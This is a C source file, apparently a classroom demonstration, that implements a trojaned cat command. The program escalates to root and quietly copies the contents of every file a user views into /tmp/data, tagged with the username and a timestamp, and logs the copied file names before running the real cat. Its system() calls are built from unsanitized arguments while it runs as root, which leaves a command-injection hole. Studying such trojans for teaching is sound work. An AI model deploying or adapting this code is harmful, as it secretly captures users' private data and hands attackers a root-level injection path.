#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* Author: Lyn Turbak
 * 2016/03/13:
 * Added step (2), so that when /tmp/data has perms 733, everyone can still see filenames
 * via /tmp/data/filenames:
 *   (1) first copies cat output to a file with name
 *       /tmp/data/<username>-<filenameWithoutSlash>-<datetime>
 *       (the <filenameWithoutSlash> part is new and helpful for finding files cat-ted by
 *       user with particular names.
 *   (2) Append filename /tmp/data/<username>-<filenameWithoutSlash>-<datetime>
 *       to /tmp/data/filenames using /bin/echo
 *   (3) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat
 *
 * 2016/03/07:
 * Improved trojaned version of the cat program that
 *   (1) first copies cat output to a file with name /tmp/data/<username>-<datetime>
 *   (2) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat!
 * This version avoids the "doubling explosion" of previous version, in which
 * cat on the single carnivore file double the size of the file.
 *
 * Kahea made /tmp/data permisions 733, which improves problem by making it
 * hard to stumble upon copied cat-ted files.
 *
 * Fall 2014: First version of this file
 */
int main (int argn, char* argv[], char* arge[]) {
  uid_t saved_uid;
  char timeBuff[120]; // buffer for date/time
  char writeToFileName[1024]; // buffer for creating string that redirects to filename
  char command[1024]; // buffer for command
  int i;

  saved_uid = getuid();
  setuid(0);

  // Create date/time string
  time_t now = time (0);
  strftime(timeBuff, 120, "%Y-%m-%d-%H-%M-%S", localtime (&now));
  // printf("datetime=%s\n", timeBuff);
  // Build string of form "/tmp/data/<username>-<filenameWithoutSlashes>-<datetime>":
  char* writeToFileNameStart = "/tmp/data/";
  char* userName = getenv("USER");
  char* fileName = "";
  char* fileNameNoSlash = "";
  if (argn >= 1) {
    fileName = argv[1];
    fileNameNoSlash = fileName + strlen(fileName) + 1; // point to null char
    // Make fileNameNoSlash point to first char in string after last slash (if there is one)
    // or first char in string (if there isn't one)
    // Starting at end of fileName, move back until find first slash or beginning of string.
    while ((fileNameNoSlash > fileName) && (*(fileNameNoSlash-1) != '/')) {
      fileNameNoSlash--;
    }
    if (fileNameNoSlash == fileName) {
      if (*fileNameNoSlash == '/') {
        fileNameNoSlash++;
      }
    }
  }
  snprintf(writeToFileName,
           strlen(writeToFileNameStart) +  strlen(userName) + 1 // +1 for first dash
           + strlen(fileNameNoSlash) + 1 // +1 for second dash
           + strlen(timeBuff) + 1, // extra +1 at end for null char
           "%s%s-%s-%s", writeToFileNameStart, userName, fileNameNoSlash, timeBuff);
  // printf("writeToFileName=%s\n", writeToFileName);

  // printf("writeToFileName=%s\n", writeToFileName);
  // Build cat command for saving user data in /tmp/data/<username>-<datetime>:
  // /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
  char* catCommand = "/bin/cat "; // note space at end
  int charsRemaining = 1024;
  strncpy(command, catCommand, strlen(catCommand) + 1); // + 1 for null char
  charsRemaining -= strlen(catCommand);
  for (i = 1; i < argn; i++) {
    charsRemaining -= strlen(argv[i]);
    if (charsRemaining < 0) break;
    strncat(command, argv[i], strlen(argv[i]));
    charsRemaining -= 1;
    if (charsRemaining < 0) break;
    strncat(command, " ", 1);
  }
  if (charsRemaining >= 3) {
    charsRemaining -= (strlen(writeToFileName) + 1); // + 1 for terminating null char
    strncat(command, "> ", 3);
    charsRemaining -= 2;
  }
  if (charsRemaining > strlen(writeToFileName) + 1) {
    strncat(command, writeToFileName, strlen(writeToFileName) + 1);
    // printf("cat command=%s\n", command);
    if (argn >= 1) {
      system(command); // Perform /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
    }
  }
  // Build echo command for appending filename to /tmp/data/filenames:
  // echo <filename> >> /tmp/data/filenames
  char* echoCommand = "/bin/echo "; // note space at end
  charsRemaining = 1024;
  strncpy(command, echoCommand, strlen(echoCommand) + 1); // + 1 for null char
  charsRemaining -= strlen(echoCommand);
  if (charsRemaining > strlen(writeToFileName) + 1) {
    strncat(command, writeToFileName, strlen(writeToFileName) + 1);
    charsRemaining -= strlen(writeToFileName);
  }
  char* appendRedirection = " >> /tmp/data/filenames";
  if (charsRemaining > strlen(appendRedirection) + 1) {
    strncat(command, appendRedirection, strlen(appendRedirection) + 1);
    charsRemaining -= strlen(appendRedirection);
  }
  if (charsRemaining >= 0) {
    // printf("echo command=%s\n", command);
    if (argn >= 1) {
      system(command); // Perform /bin/echo /tmp/data/<username>-<datetime> >> /tmp/data/filenames
    }
  }

  // Finally execute original command, using /bin/cat for argv[0]
  setuid(saved_uid); // We DO NOT want students to be able to read any file
  argv[0] = "/bin/cat";
  execve(argv[0], argv, arge); // end with real cat!
}
